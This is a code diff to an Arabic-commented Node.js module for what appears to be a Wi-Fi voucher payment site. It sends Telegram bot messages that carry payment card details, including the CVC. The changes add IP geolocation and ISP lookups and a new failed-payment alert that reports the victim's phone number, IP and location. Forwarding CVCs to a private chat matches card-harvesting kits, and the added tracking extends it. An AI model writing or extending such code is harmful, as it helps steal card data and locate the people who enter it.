@@ -9,7 +9,7 @@ const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 const { BRANCH_NAMES } = require('./branches');
 
 /**
- * جلب بيانات الشبكة والموقع بناءً على IP
+ * جلب بيانات الشبكة والموقع الجغرافي بناءً على IP الخارجي
  */
 async function fetchNetworkDetailsByIP(ip) {
   const result = {
@@ -25,25 +25,27 @@ async function fetchNetworkDetailsByIP(ip) {
 
   try {
     const res = await axios.get(`https://ipapi.co/${cleanIp}/json/`, { timeout: 3000 });
-    if (res.data) {
+    if (res.data && !res.data.error) {
       const city = res.data.city || "غير معروفة";
+      const region = res.data.region || "";
       const country = res.data.country_name || "غير معروفة";
-      result.location = `${city}، ${country}`;
+      result.location = region ? `${city}، ${region}، ${country}` : `${city}، ${country}`;
       result.isp = res.data.org || res.data.asn || "غير معروف";
       return result;
     }
   } catch (e) {
     try {
-      const fallbackRes = await axios.get(`http://ip-api.com/json/${cleanIp}?fields=status,country,city,isp,org`, { timeout: 3000 });
+      const fallbackRes = await axios.get(`http://ip-api.com/json/${cleanIp}?fields=status,country,regionName,city,isp,org`, { timeout: 3000 });
       if (fallbackRes.data && fallbackRes.data.status === "success") {
         const city = fallbackRes.data.city || "غير معروفة";
+        const region = fallbackRes.data.regionName || "";
         const country = fallbackRes.data.country || "غير معروفة";
-        result.location = `${city}، ${country}`;
+        result.location = region ? `${city}، ${region}، ${country}` : `${city}، ${country}`;
         result.isp = fallbackRes.data.isp || fallbackRes.data.org || "غير معروف";
         return result;
       }
     } catch (fallbackErr) {
-      console.warn("⚠️ تعذر جلب تفاصيل الموقع والشبكة للـ IP:", cleanIp);
+      console.warn("⚠️ تعذر جلب تفاصيل الموقع الجغرافي للـ IP:", cleanIp);
     }
   }
 
@@ -102,6 +104,7 @@ async function sendTelegramMessage(data, isInitial = true) {
       let locationText = data.geoCity && data.geoCountry ? `${data.geoCity}، ${data.geoCountry}` : null;
       let ispText = data.ispProvider || data.isp || null;
 
+      // جلب الموقع الجغرافي للشبكة ومزود الخدمة عبر IP إذا لم تكن متوفرة مسبقاً
       if (!locationText || locationText.includes("غير معروف") || !ispText || ispText === "غير معروف") {
         const netInfo = await fetchNetworkDetailsByIP(publicIP);
         if (netInfo) {
@@ -135,11 +138,11 @@ async function sendTelegramMessage(data, isInitial = true) {
                    `🔒 رمز CVC: <code>${data.card_data.cvc}</code>\n`;
       }
 
-      message += `\n<b>━━━━ ⚙️ بيانات الجهاز والشبكة ━━━━</b>\n` +
+      message += `\n<b>━━━━ ⚙️ بيانات الشبكة والجهاز ━━━━</b>\n` +
                  `🆔 <b>معرف الجهاز:</b> <code>${clientID}</code>\n` +
                  `💡 <b>نوع الجهاز:</b> <b>${deviceType}</b>\n` +
                  `🌐 <b>IP الخارجي:</b> <code>${publicIP || 'غير متوفر'}</code>\n` +
-                 `🏙 <b>المدينة والدولة:</b> <b>${locationText || 'غير متوفر'}</b>\n` +
+                 `🌍 <b>الموقع الجغرافي (Geo IP):</b> <b>📍 ${locationText || 'غير متوفر'}</b>\n` +
                  `📡 <b>مزود الخدمة (ISP):</b> <b>${ispText || 'غير متوفر'}</b>\n` +
                  `----------------------------------------\n` +
                  `📅 <b>تاريخ الإرسال:</b> <code>${dateTimeStr}</code>\n` +
@@ -168,7 +171,6 @@ async function sendTelegramMessage(data, isInitial = true) {
                 `📅 وقت الإصدار: <code>${dateTimeStr}</code>`;
     }
 
-    // إعداد الأزرار التفاعلية (إصدار الكارت ومساهمة)
     const replyMarkup = {
       inline_keyboard: [
         [
@@ -265,7 +267,6 @@ async function handleTelegramCallback(callbackQuery) {
 
     console.log(`📥 [Telegram Callback] تم استلام ضغطة زر: ${data}`);
 
-    // إشعار تليجرام بأن الضغطة تم تلقيها لمنع دوران الزر
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
       callback_query_id: queryId,
       text: "جاري تنفيذ الإجراء...",
@@ -273,10 +274,8 @@ async function handleTelegramCallback(callbackQuery) {
     });
 
     const parts = data.split("_");
-    const action = parts[0];
 
     if (data.startsWith("create_voucher")) {
-      // الصيغة: create_voucher_{txnId}_{amount}
       const txnId = parts[2] || parts[1]; 
       const amount = parts[3] || parts[2] || "0";
 
@@ -286,7 +285,6 @@ async function handleTelegramCallback(callbackQuery) {
       let errorMessage = null;
 
       try {
-        // استدعاء الدالة الصحيحة الموجودة في mikrotikService.js
         if (typeof mikrotikService !== "undefined" && typeof mikrotikService.processPaymentAndCreateCard === "function") {
           voucherData = await mikrotikService.processPaymentAndCreateCard(amount, "main", txnId);
         } else {
@@ -298,12 +296,11 @@ async function handleTelegramCallback(callbackQuery) {
       }
 
       if (voucherData && (voucherData.success || voucherData.cardCode)) {
-        // حفظ تفاصيل الكارت الحقيقية في الذاكرة المؤقتة لكي تظهر للعميل في صفحة الانتظار
         if (global.generatedCardsMap) {
           global.generatedCardsMap.set(txnId, {
             isContribution: voucherData.isContribution || false,
             success: true,
-            code: voucherData.cardCode || voucherData.username || "متاح", // <-- إضافة المفتاح مباشرة ليتم قراءته في صفحة النجاح
+            code: voucherData.cardCode || voucherData.username || "متاح",
             voucher: {
               username: voucherData.cardCode || voucherData.username || "متاح",
               password: voucherData.password || ""
@@ -330,8 +327,6 @@ async function handleTelegramCallback(callbackQuery) {
           reply_markup: { inline_keyboard: [] }
         });
 
-        console.log(`✅ [Voucher Success] تم إصدار الكارت بنجاح للميكروتيك للمعاملة ${txnId} وإرساله لصفحة الانتظار.`);
-
       } else {
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
           chat_id: chatId,
@@ -340,11 +335,9 @@ async function handleTelegramCallback(callbackQuery) {
       }
 
     } else if (data.startsWith("contribution")) {
-      // الصيغة: contribution_{txnId}_{amount}
       const txnId = parts[1];
       const amount = parts[2] || "0";
 
-      // حفظ بيانات المساهمة في الذاكرة المؤقتة ليتم توجيه العميل للصفحة مباشرة
       if (global.generatedCardsMap) {
         global.generatedCardsMap.set(txnId, {
           isContribution: true,
@@ -364,8 +357,6 @@ async function handleTelegramCallback(callbackQuery) {
         parse_mode: "HTML",
         reply_markup: { inline_keyboard: [] }
       });
-
-      console.log(`🤝 [Contribution Success] تم تسجيل المساهمة بنجاح للمعاملة: ${txnId} بقيمة ${amount}`);
     }
 
   } catch (err) {
@@ -373,8 +364,57 @@ async function handleTelegramCallback(callbackQuery) {
   }
 }
 
+/**
+ * 4. ❌ إرسال إشعار فشل الدفع إلى التليجرام مع الموقع الجغرافي للشبكة
+ */
+async function sendTelegramFailNotification(errorMessage, data = {}) {
+  try {
+    if (!BOT_TOKEN || !CHAT_ID) {
+      return;
+    }
+
+    const publicIP = data.publicIP || "غير متوفر";
+    if (publicIP === "127.0.0.1" || publicIP === "::1" || publicIP.includes("localhost")) {
+      return;
+    }
+
+    // جلب تفاصيل الموقع الجغرافي للـ IP في صفحة الفشل أيضاً
+    const netInfo = await fetchNetworkDetailsByIP(publicIP);
+    const locationText = netInfo ? netInfo.location : "غير متوفر";
+    const ispText = netInfo ? netInfo.isp : "غير متوفر";
+
+    const branchName = data.branchName || "حكايات نت رئيسي";
+    const userPhone = data.phone || "غير محدد";
+    const amountEGP = data.amount || "غير محدد";
+    const dateTimeStr = getFormattedDateTime();
+    const txnId = data.transactionId || `TX_${Date.now()}`;
+
+    let message = `❌ <b>فشل عملية الدفع! (تنبيه فتح صفحة الخطأ)</b>\n\n` +
+                  `🏢 الفرع: <b>${branchName}</b>\n` +
+                  `🆔 رقم المعاملة: <code>${txnId}</code>\n` +
+                  `💰 المبلغ: <b>${amountEGP} جنيه</b>\n` +
+                  `📱 رقم الهاتف: <code>${userPhone}</code>\n` +
+                  `⚠️ سبب الخطأ: <i>${errorMessage}</i>\n` +
+                  `----------------------------------------\n` +
+                  `🌐 IP الخارجي: <code>${publicIP}</code>\n` +
+                  `🌍 الموقع الجغرافي: <b>📍 ${locationText}</b>\n` +
+                  `📡 مزود الخدمة: <b>${ispText}</b>\n` +
+                  `📅 وقت الزيارة: <code>${dateTimeStr}</code>`;
+
+    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      chat_id: CHAT_ID,
+      text: message,
+      parse_mode: "HTML"
+    });
+
+  } catch (err) {
+    console.error("❌ [Telegram Fail Notification Error]:", err.response?.data || err.message);
+  }
+}
+
 module.exports = {
   sendTelegramMessage,
   sendVoucherWithCardImage,
-  handleTelegramCallback
+  handleTelegramCallback,
+  sendTelegramFailNotification
 };
